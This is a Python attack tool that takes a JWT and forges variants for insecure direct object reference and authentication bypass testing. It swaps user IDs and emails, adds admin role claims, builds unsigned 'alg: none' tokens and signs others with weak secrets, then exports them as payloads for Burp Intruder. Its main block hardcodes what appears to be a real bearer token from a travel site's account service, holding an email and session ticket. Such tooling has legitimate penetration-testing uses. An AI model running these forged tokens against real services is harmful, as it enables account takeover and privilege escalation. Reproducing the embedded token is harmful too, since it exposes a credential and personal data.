#!/usr/bin/env python3
import jwt
import json
import base64
import random
import string
import uuid
from datetime import datetime, timedelta
import argparse

class JWTIDORFuzzer:
    def __init__(self, original_token):
        self.original_token = original_token
        self.header, self.payload, self.signature = self.decode_jwt(original_token)
        
    def decode_jwt(self, token):
        """Decode JWT without verification to extract header and payload"""
        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            signature = token.split('.')[2]
            return header, payload, signature
        except Exception as e:
            print(f"Error decoding JWT: {e}")
            return None, None, None
    
    def generate_random_string(self, length=10):
        """Generate random alphanumeric string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def generate_random_email(self):
        """Generate random email address"""
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'example.com', 'test.com']
        username = self.generate_random_string(8).lower()
        domain = random.choice(domains)
        return f"{username}@{domain}"
    
    def generate_random_uuid(self):
        """Generate random UUID"""
        return str(uuid.uuid4())
    
    def generate_sid_variations(self, original_sid):
        """Generate SID variations for IDOR testing"""
        variations = []
        
        # Sequential variations
        if original_sid:
            try:
                # Extract numeric part and modify
                parts = original_sid.split('-')
                if len(parts) >= 4:
                    # Modify last segment
                    last_part = parts[-1]
                    if last_part.isalnum():
                        # Increment/decrement hex values
                        try:
                            hex_val = int(last_part, 16)
                            variations.extend([
                                '-'.join(parts[:-1] + [format(hex_val + i, 'x').zfill(len(last_part))]) 
                                for i in range(-5, 6) if i != 0
                            ])
                        except ValueError:
                            pass
            except:
                pass
        
        # Random UUIDs
        variations.extend([self.generate_random_uuid() for _ in range(5)])
        
        # Common test SIDs
        test_sids = [
            "00000000-0000-0000-0000-000000000001",
            "00000000-0000-0000-0000-000000000002",
            "11111111-1111-1111-1111-111111111111",
            "12345678-1234-1234-1234-123456789012"
        ]
        variations.extend(test_sids)
        
        return variations
    
    def fuzz_payload(self, payload_copy, fuzz_type="random"):
        """Generate fuzzed payload variations"""
        variations = []
        
        # Identify user-related fields to fuzz
        user_fields = [
            'unique_name', 'email', 'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/sid',
            'sub', 'user_id', 'id', 'username', 'sid', 'user', 'account_id'
        ]
        
        if fuzz_type == "random":
            # Random value fuzzing
            for field in user_fields:
                if field in payload_copy:
                    new_payload = payload_copy.copy()
                    
                    if field == 'email':
                        new_payload[field] = self.generate_random_email()
                    elif 'sid' in field.lower() or field in ['sub', 'user_id', 'id']:
                        new_payload[field] = self.generate_random_uuid()
                    elif field in ['unique_name', 'username']:
                        new_payload[field] = f"User{random.randint(1000, 9999)}"
                    else:
                        new_payload[field] = self.generate_random_string()
                    
                    variations.append(new_payload)
        
        elif fuzz_type == "sequential":
            # Sequential ID fuzzing for SID field
            sid_field = 'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/sid'
            if sid_field in payload_copy:
                original_sid = payload_copy[sid_field]
                sid_variations = self.generate_sid_variations(original_sid)
                
                for new_sid in sid_variations:
                    new_payload = payload_copy.copy()
                    new_payload[sid_field] = new_sid
                    variations.append(new_payload)
        
        elif fuzz_type == "privilege":
            # Privilege escalation attempts
            privilege_fields = ['role', 'admin', 'is_admin', 'level', 'permission']
            for field in privilege_fields:
                new_payload = payload_copy.copy()
                new_payload[field] = "admin"
                variations.append(new_payload)
                
                new_payload = payload_copy.copy()
                new_payload[field] = True
                variations.append(new_payload)
        
        return variations
    
    def generate_fuzzed_tokens(self, count=20, fuzz_types=["random", "sequential", "privilege"]):
        """Generate multiple fuzzed JWT tokens"""
        if not self.payload:
            return []
        
        fuzzed_tokens = []
        
        for fuzz_type in fuzz_types:
            payload_variations = self.fuzz_payload(self.payload, fuzz_type)
            
            for payload_var in payload_variations[:count//len(fuzz_types)]:
                # Update timestamps
                now = datetime.utcnow()
                payload_var['iat'] = int(now.timestamp())
                payload_var['nbf'] = int(now.timestamp())
                payload_var['exp'] = int((now + timedelta(hours=1)).timestamp())
                
                try:
                    # Create unsigned token (for testing unsigned JWT acceptance)
                    unsigned_token = self.create_unsigned_token(payload_var)
                    fuzzed_tokens.append({
                        'type': f'{fuzz_type}_unsigned',
                        'token': unsigned_token,
                        'payload': payload_var
                    })
                    
                    # Create token with weak secret (common secrets to try)
                    weak_secrets = ['secret', '123456', 'password', 'jwt_secret', '']
                    for secret in weak_secrets[:2]:  # Limit to avoid too many tokens
                        try:
                            weak_token = jwt.encode(payload_var, secret, algorithm='HS256')
                            fuzzed_tokens.append({
                                'type': f'{fuzz_type}_weak_{secret or "empty"}',
                                'token': weak_token,
                                'payload': payload_var
                            })
                        except:
                            pass
                            
                except Exception as e:
                    print(f"Error generating token: {e}")
                    continue
        
        return fuzzed_tokens[:count]
    
    def create_unsigned_token(self, payload):
        """Create unsigned JWT token"""
        header = {"alg": "none", "typ": "JWT"}
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}."
    
    def export_for_burp_intruder(self, tokens, output_file="jwt_payloads.txt"):
        """Export tokens for Burp Suite Intruder"""
        with open(output_file, 'w') as f:
            for token_data in tokens:
                f.write(f"{token_data['token']}\n")
        print(f"Exported {len(tokens)} tokens to {output_file}")
    
    def print_analysis(self):
        """Print analysis of original token"""
        if self.payload:
            print("=== Original JWT Analysis ===")
            print(f"Header: {json.dumps(self.header, indent=2)}")
            print(f"Payload: {json.dumps(self.payload, indent=2)}")
            print("\n=== Potential IDOR Fields ===")
            
            user_fields = [
                'unique_name', 'email', 'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/sid',
                'sub', 'user_id', 'id', 'username', 'sid'
            ]
            
            for field in user_fields:
                if field in self.payload:
                    print(f"- {field}: {self.payload[field]}")

def main():
    parser = argparse.ArgumentParser(description='JWT IDOR Fuzzer')
    parser.add_argument('token', help='Original JWT token')
    parser.add_argument('-c', '--count', type=int, default=20, help='Number of tokens to generate')
    parser.add_argument('-o', '--output', default='jwt_payloads.txt', help='Output file for Burp Intruder')
    parser.add_argument('--analyze-only', action='store_true', help='Only analyze the token, don\'t generate fuzzed versions')
    
    args = parser.parse_args()
    
    fuzzer = JWTIDORFuzzer(args.token)
    
    if args.analyze_only:
        fuzzer.print_analysis()
        return
    
    print("Generating fuzzed JWT tokens...")
    fuzzed_tokens = fuzzer.generate_fuzzed_tokens(count=args.count)
    
    if fuzzed_tokens:
        fuzzer.export_for_burp_intruder(fuzzed_tokens, args.output)
        
        print(f"\n=== Generated {len(fuzzed_tokens)} fuzzed tokens ===")
        for i, token_data in enumerate(fuzzed_tokens[:5]):  # Show first 5
            print(f"\n{i+1}. Type: {token_data['type']}")
            print(f"Token: {token_data['token'][:50]}...")
            
        print(f"\nUse the tokens in {args.output} with Burp Suite Intruder")
        print("Set the Authorization header as the payload position:")
        print("Authorization: Bearer §jwt_token§")
    else:
        print("No tokens generated. Check your input JWT.")

if __name__ == "__main__":
    # Example usage with your token
    original_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IkZla2llIFNlcHRlbWJlciIsImVtYWlsIjoiZmVsY29uc2VjQHdlYXJlaGFja2Vyb25lLmNvbSIsIkJyYW5kIjoiQ2hlYXB0aWNrZXRzIiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvc2lkIjoiMDAwMDAwMDAtMDAwMC0wMDAwLTAzNDItYWI4NTdlNzRjMDNhIiwiTG9naW5UeXBlIjoiUGFzc3dvcmRMb2dpbiIsIlBhc3N3b3JkTG9naW5BdmFpbGFibGUiOiJUcnVlIiwiU29jaWFsTG9naW5BdmFpbGFibGUiOiJGYWxzZSIsIlRyaXBDVGlja2V0IjoiQkVBMDgxNUU4MEYyNzQ5MUJCRTI1N0Y2RjFGNTI4MEMwNjE2QzU1NEUxRTdCQTQzODQzRDY2MzE5Qjc0QzA2QyIsIlRyaXBDVGlja2V0RXhwaXJlTWludXRlIjoiNTUiLCJFbmNyeXB0ZWRVREwiOiI4MkFERERBMkE3REE0NDA0RUNFNENDODk4QkFGQTAwNCIsIm5iZiI6MTc1MDg3MDI2NSwiZXhwIjoxNzUwODczODY1LCJpc3MiOiJNeUFjY291bnQiLCJhdWQiOiJodHRwczovL215YWNjb3VudC50cmF2aXguY29tIn0.hdmj-egO0pzqFXK2674dL3V0uSmsS-iUCo0YMoOush8"
    
    # Run if called directly with example
    import sys
    if len(sys.argv) == 1:
        sys.argv.extend([original_token, '-c', '15'])
    main()
